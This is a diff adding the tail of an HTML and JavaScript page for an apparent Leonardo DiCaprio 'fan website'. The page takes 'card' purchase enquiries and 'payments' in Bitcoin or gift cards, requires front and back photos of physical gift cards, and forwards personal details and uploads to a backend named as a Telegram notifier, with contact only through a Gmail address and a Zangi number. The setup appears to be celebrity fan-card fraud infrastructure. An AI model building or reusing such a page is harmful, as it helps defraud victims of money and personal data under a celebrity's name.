+<img id="backPreview" class="upload-preview" alt="Back card preview">
+</label>
+</div>
+
+<p class="privacy-note">
+Redact the full card number, redemption code,
+PIN, barcode and QR code before selecting a photo.
+</p>
+
+</div>
+
+
+<div id="digitalCardUploads" style="display:none">
+
+<div class="form-group">
+<label class="support-label" for="giftEvidence">
+Digital Card Purchase Receipt (redacted)
+</label>
+
+<label class="upload-box">
+📄<br>Tap to upload redacted receipt
+<input type="file" id="giftEvidence"
+accept="image/jpeg,image/png,image/webp,application/pdf">
+</label>
+</div>
+
+<p class="privacy-note">
+Remove redemption codes, PINs, barcodes,
+QR codes and unnecessary personal information.
+</p>
+
+</div>
+
+
+<div class="form-group">
+<label class="support-label" for="giftReference">Payment Reference</label>
+<input type="text" id="giftReference"
+maxlength="120"
+placeholder="Enter a non-sensitive payment reference">
+</div>
+
+<div class="form-group">
+<label class="support-label" for="giftNotes">Additional Notes</label>
+<textarea id="giftNotes" rows="4"
+maxlength="1000"
+placeholder="Enter non-sensitive additional information..."></textarea>
+</div>
+
+</div>
+
+
+<label class="consent">
+<input type="checkbox" id="supportConsent">
+<span>
+I have reviewed the payment information and
+agree to the processing of my contact details
+for support administration and payment review.
+</span>
+</label>
+
+<button class="submit-button" id="submitSupport" type="button">
+SUBMIT PAYMENT
+</button>
+
+<div class="form-status" id="supportStatus"
+role="status" aria-live="polite"></div>
+
+<p class="privacy-note">
+Submitting this form does not itself verify payment.
+Never provide passwords, private wallet keys,
+complete gift-card redemption codes, PINs,
+barcodes or security credentials.
+Only upload redacted documents.
+</p>
+
+</div>
+</div>
+</section>
+
+
+<!-- NEWSLETTER -->
+
+<section class="updates" id="updates">
+
+<div class="container">
+
+<div class="eyebrow">Stay connected</div>
+
+<h2>STAY IN THE LOOP</h2>
+
+<p>Receive updates, featured articles and announcements.</p>
+
+<form class="signup" id="newsletterForm">
+
+<input type="email"
+placeholder="Enter your email address"
+required>
+
+<button class="button" type="submit">SUBSCRIBE</button>
+
+</form>
+
+</div>
+</section>
+
+
+<!-- CONTACT -->
+
+<section id="contact">
+
+<div class="container">
+
+<div class="section-head">
+
+<div class="eyebrow">We're here to help</div>
+
+<h2>CONTACT MANAGEMENT</h2>
+
+<p>
+Have a question about the website, fan community
+or featured collection? Contact the website
+management team using the details below.
+</p>
+
+</div>
+
+<div class="contact-grid">
+
+<div class="contact-card">
+<h3>EMAIL ENQUIRIES</h3>
+<p>For general questions and website correspondence, contact management by email.</p>
+<p class="contact-detail">mt0136959@gmail.com</p>
+<a href="mailto:mt0136959@gmail.com" class="button">SEND AN EMAIL</a>
+</div>
+
+<div class="contact-card">
+<h3>ZANGI CONTACT</h3>
+<p>For direct correspondence, reach the website management team through Zangi.</p>
+<p class="contact-detail">Zangi Number: 1059040366</p>
+<a href="https://services.zangi.com/dl/conversation/1059040366"
+target="_blank" rel="noopener noreferrer" class="button">CONTACT ON ZANGI</a>
+</div>
+
+</div>
+
+<p style="text-align:center;color:#696969;font-size:.8rem;margin-top:25px">
+These contact details are provided for website management enquiries.
+</p>
+
+</div>
+</section>
+
+
+<!-- FOOTER -->
+
+<footer>
+
+<div class="logo" style="color:white">
+LEONARDO DICAPRIO FAN WEBSITE
+</div>
+
+<p>© <span id="year"></span> All rights reserved.</p>
+
+<p class="disclaimer">
+This is an independently operated fan website.
+It is not affiliated with, endorsed by, or officially
+connected to Leonardo DiCaprio or his representatives.
+
+This website provides informational and fan-community
+content about his cinematic career. Any product or
+service described here must have accurate descriptions,
+applicable permissions and transparent terms.
+</p>
+
+</footer>
+
+
+<!-- TOAST NOTIFICATION -->
+
+<div id="toastMessage"
+class="toast-message"
+role="status"
+aria-live="polite"></div>
+
+
+<script>
+
+/* =========================================
+   SECURE SUPABASE BACKEND CONFIGURATION
+========================================= */
+
+const TELEGRAM_BACKEND_URL =
+    "https://rcnruuyovulxeovvoikb.supabase.co/functions/v1/leonardo-notifications";
+
+const SUPABASE_PUBLISHABLE_KEY =
+    "sb_publishable_xxUzSIKp5LmLCeFzW5OsmA_nT-KbWel";
+
+const MAX_UPLOAD_BYTES = 5 * 1024 * 1024;
+
+const REQUEST_TIMEOUT_MS = 60000;
+
+
+/* =========================================
+   TOAST NOTIFICATION SYSTEM
+========================================= */
+
+let toastTimer;
+
+function showToast(message, type = "success") {
+
+    const toast =
+        document.getElementById("toastMessage");
+
+    clearTimeout(toastTimer);
+
+    toast.textContent = message;
+
+    toast.className =
+        "toast-message show " + type;
+
+    if (type !== "loading") {
+
+        toastTimer = setTimeout(() => {
+
+            toast.classList.remove("show");
+
+        }, 4500);
+
+    }
+
+}
+
+
+/* =========================================
+   STATUS HELPERS
+========================================= */
+
+function showStatus(element, message, isError=false) {
+
+    element.textContent = message;
+
+    element.style.display = 'block';
+
+    element.classList.toggle('error', isError);
+
+}
+
+
+function backendConfigured() {
+
+    return Boolean(
+        TELEGRAM_BACKEND_URL &&
+        SUPABASE_PUBLISHABLE_KEY
+    );
+
+}
+
+
+/* =========================================
+   SUPABASE FORM SUBMISSION
+========================================= */
+
+async function postToBackend(formData) {
+
+    if (!backendConfigured()) {
+
+        throw new Error(
+            'The secure submission service is not connected. Your information has NOT been sent. Please contact management.'
+        );
+
+    }
+
+    const controller = new AbortController();
+
+    const timer = setTimeout(
+        () => controller.abort(),
+        REQUEST_TIMEOUT_MS
+    );
+
+    try {
+
+        const response = await fetch(
+            TELEGRAM_BACKEND_URL,
+            {
+                method:'POST',
+
+                headers:{
+                    'apikey':SUPABASE_PUBLISHABLE_KEY
+                },
+
+                body:formData,
+
+                signal:controller.signal
+            }
+        );
+
+        let result = {};
+
+        try {
+            result = await response.json();
+        } catch(error) {
+
+            throw new Error(
+                'The server returned an invalid response.'
+            );
+
+        }
+
+        if (!response.ok || result.ok !== true) {
+
+            throw new Error(
+                result.message ||
+                'The server could not confirm receipt of your submission.'
+            );
+
+        }
+
+        return result;
+
+    } catch(error) {
+
+        if (error.name === 'AbortError') {
+
+            throw new Error(
+                'The request timed out. Check your connection and try again.'
+            );
+
+        }
+
+        throw error;
+
+    } finally {
+
+        clearTimeout(timer);
+
+    }
+
+}
+
+
+function appendText(formData, key, value) {
+
+    formData.append(
+        key,
+        String(value ?? '').trim()
+    );
+
+}
+
+
+function safeFile(file, allowedTypes, label) {
+
+    if (!file) return;
+
+    if (!allowedTypes.includes(file.type)) {
+
+        throw new Error(
+            label + ' has an unsupported file type.'
+        );
+
+    }
+
+    if (file.size > MAX_UPLOAD_BYTES) {
+
+        throw new Error(
+            label + ' must be 5 MB or smaller.'
+        );
+
+    }
+
+}
+
+
+/* =========================================
+   MOBILE MENU
+========================================= */
+
+const hamburger =
+document.getElementById('hamburger');
+
+const mobileMenu =
+document.getElementById('mobileMenu');
+
+hamburger.addEventListener('click', () => {
+
+    const isOpen =
+        mobileMenu.classList.toggle('open');
+
+    hamburger.textContent =
+        isOpen ? '×' : '☰';
+
+    hamburger.setAttribute(
+        'aria-expanded',
+        String(isOpen)
+    );
+
+});
+
+mobileMenu.querySelectorAll('a').forEach(link => {
+
+    link.addEventListener('click', () => {
+
+        mobileMenu.classList.remove('open');
+
+        hamburger.textContent = '☰';
+
+        hamburger.setAttribute(
+            'aria-expanded',
+            'false'
+        );
+
+    });
+
+});
+
+
+/* =========================================
+   CARD REQUEST BUTTONS
+========================================= */
+
+document.querySelectorAll('.card-request-btn')
+.forEach(button => {
+
+    button.addEventListener('click', () => {
+
+        document.getElementById('purchaseCard').value =
+            button.dataset.card;
+
+        document.getElementById('purchaseFormBox')
+        .scrollIntoView({
+            behavior:'smooth',
+            block:'start'
+        });
+
+    });
+
+});
+
+
+/* =========================================
+   PURCHASE ENQUIRY
+========================================= */
+
+document.getElementById('cardPurchaseForm')
+.addEventListener('submit', async function(event) {
+
+    event.preventDefault();
+
+    const form = this;
+
+    const status =
+        document.getElementById('purchaseStatus');
+
+    const submit =
+        document.getElementById('purchaseSubmit');
+
+    if (!form.reportValidity()) {
+
+        showToast(
+            'Please complete all required enquiry fields.',
+            'error'
+        );
+
+        return;
+
+    }
+
+    const payload = new FormData();
+
+    payload.append('type','card_enquiry');
+
+    appendText(payload,'card',
+        document.getElementById('purchaseCard').value);
+
+    appendText(payload,'name',
+        document.getElementById('purchaseName').value);
+
+    appendText(payload,'phone',
+        document.getElementById('purchasePhone').value);
+
+    appendText(payload,'email',
+        document.getElementById('purchaseEmail').value);
+
+    appendText(payload,'message',
+        document.getElementById('purchaseMessage').value);
+
+    payload.append('consent','true');
+
+    submit.disabled = true;
+
+    submit.textContent = 'SENDING...';
+
+    showToast(
+        'Submitting your enquiry...',
+        'loading'
+    );
+
+    try {
+
+        await postToBackend(payload);
+
+        showToast(
+            'Your enquiry has been received.',
+            'success'
+        );
+
+        showStatus(
+            status,
+            'Your enquiry was received by the submission service.'
+        );
+
+        form.reset();
+
+    } catch(error) {
+
+        showToast(
+            error.message,
+            'error'
+        );
+
+        showStatus(
+            status,
+            error.message,
+            true
+        );
+
+    } finally {
+
+        submit.disabled = false;
+
+        submit.textContent = 'SEND PURCHASE ENQUIRY';
+
+    }
+
+});
+
+
+/* =========================================
+   COUNTRY LIST
+========================================= */
+
+const countryCodes = `
+AD AE AF AG AI AL AM AO AQ AR AS AT AU AW AX AZ
+BA BB BD BE BF BG BH BI BJ BL BM BN BO BQ BR BS BT
+BV BW BY BZ CA CC CD CF CG CH CI CK CL CM CN CO CR
+CU CV CW CX CY CZ DE DJ DK DM DO DZ EC EE EH ER
+ES ET FI FJ FK FM FO FR GA GD GE GF GG GH GI GL
+GM GN GP GQ GR GS GT GU GW GY HK HM HN HR HT HU
+ID IE IL IM IN IO IQ IR IS IT JE JM JO JP KE KG KH
+KI KM KN KP KR KW KY KZ LA LB LC LI LK LR LS LT LU
+LV LY MA MC MD ME MF MG MH MK ML MM MN MO MP MQ MR
+MS MT MU MV MW MX MY MZ NA NC NE NF NG NI NL NO NP
+NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW
+PY QA RE RO RS RU RW SA SB SC SD SE SG SH SI SJ SK
+SL SM SN SO SR SS ST SV SX SY SZ TC TD TF TG TH TJ
+TK TL TM TN TO TR TT TV TW TZ UA UG UM US UY UZ
+VA VC VE VG VI VN VU WF WS YE YT ZA ZM ZW
+`;
+
+const regionNames = new Intl.DisplayNames(
+    ['en'],
+    {type:'region'}
+);
+
+const countryList =
+countryCodes.trim().split(/\s+/);
+
+
+function populateCountries(selectId) {
+
+    const select =
+        document.getElementById(selectId);
+
+    countryList
+    .map(code => ({
+        code,
+        name:regionNames.of(code)
+    }))
+    .filter(country =>
+        country.name && country.name !== country.code
+    )
+    .sort((a,b) =>
+        a.name.localeCompare(b.name)
+    )
+    .forEach(country => {
+
+        const option =
+            document.createElement('option');
+
+        option.value = country.code;
+
+        option.textContent = country.name;
+
+        select.appendChild(option);
+
+    });
+
+}
+
+
+populateCountries('supporterCountry');
+
+populateCountries('giftCountry');
+
+
+/* COUNTRY SEARCH */
+
+function enableCountrySearch(searchId, selectId) {
+
+    const search =
+        document.getElementById(searchId);
+
+    const select =
+        document.getElementById(selectId);
+
+    const originalOptions =
+        Array.from(select.options)
+        .filter(option => option.value !== '');
+
+    search.addEventListener('input', function() {
+
+        const query =
+            this.value.trim().toLowerCase();
+
+        const current = select.value;
+
+        select.innerHTML =
+            '<option value="">Select Country</option>';
+
+        originalOptions
+        .filter(option =>
+            option.textContent.toLowerCase().includes(query)
+        )
+        .forEach(option => {
+
+            select.appendChild(
+                option.cloneNode(true)
+            );
+
+        });
+
+        if (current &&
+            Array.from(select.options).some(
+                option => option.value === current
+            )) {
+
+            select.value = current;
+
+        }
+
+    });
+
+}
+
+
+enableCountrySearch(
+    'supporterCountrySearch',
+    'supporterCountry'
+);
+
+enableCountrySearch(
+    'giftCountrySearch',
+    'giftCountry'
+);
+
+
+/* =========================================
+   CURRENCY LIST
+========================================= */
+
+const currencySelect =
+document.getElementById('giftCurrency');
+
+const currencyNames =
+new Intl.DisplayNames(
+    ['en'],
+    {type:'currency'}
+);
+
+let currencyCodes = [];
+
+if (typeof Intl.supportedValuesOf === 'function') {
+
+    try {
+
+        currencyCodes =
+            Intl.supportedValuesOf('currency');
+
+    } catch(error) {}
+
+}
+
+if (!currencyCodes.length) {
+
+    currencyCodes = `
+    AED AFN ALL AMD ANG AOA ARS AUD AWG AZN
+    BAM BBD BDT BGN BHD BIF BMD BND BOB BRL
+    BSD BTN BWP BYN BZD CAD CDF CHF CLP CNY
+    COP CRC CUP CVE CZK DJF DKK DOP DZD EGP
+    ERN ETB EUR FJD FKP GBP GEL GHS GIP GMD
+    GNF GTQ GYD HKD HNL HUF IDR ILS INR IQD
+    IRR ISK JMD JOD JPY KES KGS KHR KMF KRW
+    KWD KYD KZT LAK LBP LKR LRD LSL LYD MAD
+    MDL MGA MKD MMK MNT MOP MRU MUR MVR MWK
+    MXN MYR MZN NAD NGN NIO NOK NPR NZD OMR
+    PAB PEN PGK PHP PKR PLN PYG QAR RON RSD
+    RUB RWF SAR SBD SCR SDG SEK SGD SHP SLE
+    SOS SRD SSP STN SYP SZL THB TJS TMT TND
+    TOP TRY TTD TWD TZS UAH UGX USD UYU UZS
+    VES VND VUV WST XAF XCD XOF XPF YER ZAR ZMW
+    `.trim().split(/\s+/);
+
+}
+
+[
+    'USD','EUR','GBP','NGN',
+    'CAD','AUD','JPY','CHF'
+].forEach(code => {
+
+    if (!currencyCodes.includes(code)) {
+        currencyCodes.push(code);
+    }
+
+});
+
+currencyCodes.sort().forEach(code => {
+
+    let name = code;
+
+    try {
+        name = currencyNames.of(code);
+    } catch(error) {}
+
+    const option =
+        document.createElement('option');
+
+    option.value = code;
+
+    option.textContent = `${code} - ${name}`;
+
+    currencySelect.appendChild(option);
+
+});
+
+
+/* CURRENCY SEARCH */
+
+const currencySearch =
+document.getElementById('giftCurrencySearch');
+
+const originalCurrencies =
+Array.from(currencySelect.options)
+.filter(option => option.value !== '');
+
+currencySearch.addEventListener('input', function() {
+
+    const query =
+        this.value.trim().toLowerCase();
+
+    const current = currencySelect.value;
+
+    currencySelect.innerHTML =
+        '<option value="">Select Currency</option>';
+
+    originalCurrencies
+    .filter(option =>
+        option.textContent.toLowerCase().includes(query)
+    )
+    .forEach(option => {
+
+        currencySelect.appendChild(
+            option.cloneNode(true)
+        );
+
+    });
+
+    if (current &&
+        Array.from(currencySelect.options).some(
+            option => option.value === current
+        )) {
+
+        currencySelect.value = current;
+
+    }
+
+});
+
+
+/* =========================================
+   GIFT CARD FORMAT INFORMATION
+========================================= */
+
+const giftCardFormats = {
+
+    "Apple (iTunes)": {
+        format:"Format varies by card and country",
+        note:"Use the issuer instructions to identify the product. Never share the redemption code."
+    },
+
+    "Amazon": {
+        format:"Format varies by marketplace",
+        note:"Amazon gift card formats vary. Do not disclose the claim code."
+    },
+
+    "Google Play": {
+        format:"Format varies by country and product",
+        note:"Check the official issuer instructions. Never share the redemption code."
+    },
+
+    "Steam": {
+        format:"Format varies by product",
+        note:"Check Steam support for details. Never share the Wallet code."
+    },
+
+    "Razer Gold PIN": {
+        format:"Format varies by product and region",
+        note:"Never disclose the PIN or redemption code."
+    },
+
+    "Razer Gift Card": {
+        format:"Format varies by product and region",
+        note:"Never disclose the PIN or redemption code."
+    },
+
+    "Xbox": {
+        format:"Microsoft prepaid code format varies by product",
+        note:"Never share the complete redeemable code."
+    },
+
+    "Other": {
+        format:"Varies by issuer",
+        note:"Check the official card issuer instructions."
+    }
+
+};
+
+
+document.getElementById('cardBrand')
+.addEventListener('change', function() {
+
+    const selected =
+        giftCardFormats[this.value];
+
+    document.getElementById('giftFormat').value =
+        selected
+        ? selected.format
+        : 'Select a card brand to see general format information';
+
+    document.getElementById('giftFormatNote').textContent =
+        selected
+        ? selected.note
+        : 'Format information is for identification only. No code or PIN is requested.';
+
+});
+
+
+/* =========================================
+   PAYMENT METHOD SELECTION
+========================================= */
+
+let selectedPayment = '';
+
+const bitcoinChoice =
+document.getElementById('bitcoinChoice');
+
+const giftChoice =
+document.getElementById('giftChoice');
+
+const bitcoinPanel =
+document.getElementById('bitcoinPanel');
+
+const giftPanel =
+document.getElementById('giftPanel');
+
+
+bitcoinChoice.addEventListener('click', () => {
+
+    selectedPayment = 'Bitcoin';
+
+    bitcoinChoice.classList.add('active');
+
+    giftChoice.classList.remove('active');
+
+    bitcoinChoice.setAttribute('aria-pressed','true');
+
+    giftChoice.setAttribute('aria-pressed','false');
+
+    bitcoinPanel.classList.add('active');
+
+    giftPanel.classList.remove('active');
+
+});
+
+
+giftChoice.addEventListener('click', () => {
+
+    selectedPayment = 'Gift Card';
+
+    giftChoice.classList.add('active');
+
+    bitcoinChoice.classList.remove('active');
+
+    giftChoice.setAttribute('aria-pressed','true');
+
+    bitcoinChoice.setAttribute('aria-pressed','false');
+
+    giftPanel.classList.add('active');
+
+    bitcoinPanel.classList.remove('active');
+
+});
+
+
+/* =========================================
+   PHYSICAL AND DIGITAL CARD UPLOADS
+========================================= */
+
+const cardTypeSelect =
+document.getElementById('cardType');
+
+const physicalUploads =
+document.getElementById('physicalCardUploads');
+
+const digitalUploads =
+document.getElementById('digitalCardUploads');
+
+
+cardTypeSelect.addEventListener('change', function() {
+
+    physicalUploads.style.display =
+        this.value === 'Physical' ? 'block' : 'none';
+
+    digitalUploads.style.display =
+        this.value === 'Digital' ? 'block' : 'none';
+
+});
+
+
+/* =========================================
+   IMAGE PREVIEWS
+========================================= */
+
+function previewImage(inputId, previewId) {
+
+    const input =
+        document.getElementById(inputId);
+
+    const preview =
+        document.getElementById(previewId);
+
+    input.addEventListener('change', function() {
+
+        const file = this.files[0];
+
+        if (!file) {
+
+            preview.style.display = 'none';
+
+            return;
+
+        }
+
+        const allowedTypes = [
+            'image/jpeg',
+            'image/png',
+            'image/webp'
+        ];
+
+        if (!allowedTypes.includes(file.type)) {
+
+            showToast(
+                'Choose a JPG, PNG or WEBP image.',
+                'error'
+            );
+
+            this.value = '';
+
+            preview.style.display = 'none';
+
+            return;
+
+        }
+
+        if (file.size > MAX_UPLOAD_BYTES) {
+
+            showToast(
+                'Choose an image smaller than 5 MB.',
+                'error'
+            );
+
+            this.value = '';
+
+            preview.style.display = 'none';
+
+            return;
+
+        }
+
+        const reader = new FileReader();
+
+        reader.onload = function(event) {
+
+            preview.src = event.target.result;
+
+            preview.style.display = 'block';
+
+        };
+
+        reader.readAsDataURL(file);
+
+    });
+
+}
+
+
+previewImage('giftFrontImage','frontPreview');
+
+previewImage('giftBackImage','backPreview');
+
+
+document.getElementById('giftEvidence')
+.addEventListener('change', function() {
+
+    const file = this.files[0];
+
+    if (!file) return;
+
+    const allowedTypes = [
+        'image/jpeg',
+        'image/png',
+        'image/webp',
+        'application/pdf'
+    ];
+
+    if (!allowedTypes.includes(file.type) ||
+        file.size > MAX_UPLOAD_BYTES) {
+
+        showToast(
+            'Choose an accepted receipt file no larger than 5 MB.',
+            'error'
+        );
+
+        this.value = '';
+
+    }
+
+});
+
+
+/* =========================================
+   COPY BITCOIN ADDRESS
+========================================= */
+
+document.getElementById('copyWallet')
+.addEventListener('click', async () => {
+
+    const address =
+        document.getElementById('walletAddress')
+        .textContent.trim();
+
+    try {
+
+        if (navigator.clipboard && window.isSecureContext) {
+
+            await navigator.clipboard.writeText(address);
+
+        } else {
+
+            const temp =
+                document.createElement('textarea');
+
+            temp.value = address;
+
+            document.body.appendChild(temp);
+
+            temp.select();
+
+            const copied =
+                document.execCommand('copy');
+
+            temp.remove();
+
+            if (!copied) {
+                throw new Error('Copy failed');
+            }
+
+        }
+
+        showToast(
+            'Bitcoin wallet address copied.',
+            'success'
+        );
+
+    } catch(error) {
+
+        showToast(
+            'Please copy the wallet address manually.',
+            'error'
+        );
+
+    }
+
+});
+
+
+/* =========================================
+   SUPPORT SUBMISSION
+========================================= */
+
+document.getElementById('submitSupport')
+.addEventListener('click', async () => {
+
+    const status =
+        document.getElementById('supportStatus');
+
+    const submit =
+        document.getElementById('submitSupport');
+
+    const amount =
+        Number(document.getElementById('customAmount').value);
+
+    const name =
+        document.getElementById('supporterName').value.trim();
+
+    const email =
+        document.getElementById('supporterEmail').value.trim();
+
+    const phone =
+        document.getElementById('supporterPhone').value.trim();
+
+    const country =
+        document.getElementById('supporterCountry').value;
+
+    const consent =
+        document.getElementById('supportConsent').checked;
+
+
+    /* VALIDATE AMOUNT */
+
+    if (!Number.isFinite(amount) ||
+        amount <= 0 ||
+        amount > 1000000) {
+
+        showToast(
+            'Please enter a valid contribution amount in USD.',
+            'error'
+        );
+
+        return;
+
+    }
+
+
+    /* VALIDATE CONTACT DETAILS */
+
+    if (!name || !email || !phone || !country) {
+
+        showToast(
+            'Please complete all contact information.',
+            'error'
+        );
+
+        return;
+
+    }
+
+
+    /* VALIDATE PAYMENT METHOD */
+
+    if (!selectedPayment) {
+
+        showToast(
+            'Please select a payment method.',
+            'error'
+        );
+
+        return;
+
+    }
+
+
+    /* VALIDATE CONSENT */
+
+    if (!consent) {
+
+        showToast(
+            'Please accept the information processing notice.',
+            'error'
+        );
+
+        return;
+
+    }
+
+
+    const payload = new FormData();
+
+    payload.append('type','support_submission');
+
+    appendText(payload,'amount_usd',amount.toFixed(2));
+
+    appendText(payload,'name',name);
+
+    appendText(payload,'email',email);
+
+    appendText(payload,'phone',phone);
+
+    appendText(payload,'country',country);
+
+    appendText(payload,'payment_method',selectedPayment);
+
+    payload.append('consent','true');
+
+
+    /* BITCOIN */
+
+    if (selectedPayment === 'Bitcoin') {
+
+        appendText(
+            payload,
+            'bitcoin_wallet_address',
+            document.getElementById('walletAddress').textContent
+        );
+
+        appendText(
+            payload,
+            'bitcoin_transaction_id',
+            document.getElementById('btcTransaction').value
+        );
+
+    }
+
+
+    /* GIFT CARD METADATA */
+
+    if (selectedPayment === 'Gift Card') {
+
+        const cardType =
+            document.getElementById('cardType').value;
+
+        const brand =
+            document.getElementById('cardBrand').value;
+
+        const giftCountry =
+            document.getElementById('giftCountry').value;
+
+        const giftAmount =
+            Number(document.getElementById('giftAmount').value);
+
+        const currency =
+            document.getElementById('giftCurrency').value;
+
+        const lastFour =
+            document.getElementById('giftCodeLastFour').value.trim();
+
+        const reference =
+            document.getElementById('giftReference').value.trim();
+
+
+        if (!cardType || !brand || !giftCountry ||
+            !Number.isFinite(giftAmount) ||
+            giftAmount <= 0 ||
+            !currency ||
+            !reference) {
+
+            showToast(
+                'Complete the card type, brand, country, balance, currency and payment reference.',
+                'error'
+            );
+
+            return;
+
+        }
+
+
+        if (lastFour &&
+            !/^[A-Za-z0-9]{4}$/.test(lastFour)) {
+
+            showToast(
+                'The optional card reference must contain four characters.',
+                'error'
+            );
+
+            return;
+
+        }
+
+
+        appendText(payload,'card_type',cardType);
+
+        appendText(payload,'card_brand',brand);
+
+        appendText(payload,'gift_country',giftCountry);
+
+        appendText(payload,'gift_balance',giftAmount.toFixed(2));
+
+        appendText(payload,'gift_currency',currency);
+
+        appendText(payload,'card_reference_last_four',lastFour);
+
+        appendText(payload,'payment_reference',reference);
+
+        appendText(
+            payload,
+            'gift_notes',
+            document.getElementById('giftNotes').value
+        );
+
+
+        const front =
+            document.getElementById('giftFrontImage').files[0];
+
+        const back =
+            document.getElementById('giftBackImage').files[0];
+
+        const receipt =
+            document.getElementById('giftEvidence').files[0];
+
+
+        if (cardType === 'Physical') {
+
+            if (!front || !back) {
+
+                showToast(
+                    'Select both redacted card photos.',
+                    'error'
+                );
+
+                return;
+
+            }
+
+            try {
+
+                safeFile(
+                    front,
+                    ['image/jpeg','image/png','image/webp'],
+                    'Front image'
+                );
+
+                safeFile(
+                    back,
+                    ['image/jpeg','image/png','image/webp'],
+                    'Back image'
+                );
+
+            } catch(error) {
+
+                showToast(error.message,'error');
+
+                return;
+
+            }
+
+            payload.append('front_image',front,front.name);
+
+            payload.append('back_image',back,back.name);
+
+        }
+
+
+        if (cardType === 'Digital') {
+
+            if (!receipt) {
+
+                showToast(
+                    'Select a redacted digital purchase receipt.',
+                    'error'
+                );
+
+                return;
+
+            }
+
+            try {
+
+                safeFile(
+                    receipt,
+                    [
+                        'image/jpeg',
+                        'image/png',
+                        'image/webp',
+                        'application/pdf'
+                    ],
+                    'Receipt'
+                );
+
+            } catch(error) {
+
+                showToast(error.message,'error');
+
+                return;
+
+            }
+
+            payload.append(
+                'digital_receipt',
+                receipt,
+                receipt.name
+            );
+
+        }
+
+    }
+
+
+    /* SUBMIT */
+
+    submit.disabled = true;
+
+    submit.textContent = 'SUBMITTING...';
+
+    showToast(
+        'Submitting your information...',
+        'loading'
+    );
+
+    showStatus(
+        status,
+        'Your submission is being processed...'
+    );
+
+
+    try {
+
+        await postToBackend(payload);
+
+        showToast(
+            'Your submission has been received successfully.',
+            'success'
+        );
+
+        showStatus(
+            status,
+            'The submission service confirmed receipt. This does not independently verify payment.'
+        );
+
+    } catch(error) {
+
+        showToast(
+            error.message,
+            'error'
+        );
+
+        showStatus(
+            status,
+            error.message,
+            true
+        );
+
+    } finally {
+
+        submit.disabled = false;
+
+        submit.textContent = 'SUBMIT PAYMENT';
+
+    }
+
+});
+
+
+/* =========================================
+   NEWSLETTER
+========================================= */
+
+document.getElementById('newsletterForm')
+.addEventListener('submit', event => {
+
+    event.preventDefault();
+
+    showToast(
+        'Newsletter registration is not connected yet.',
+        'error'
+    );
+
+});
+
+
+/* =========================================
+   COPYRIGHT YEAR
+========================================= */
+
+document.getElementById('year').textContent =
+    new Date().getFullYear();
+
+</script>
+
+</body>
+</html>
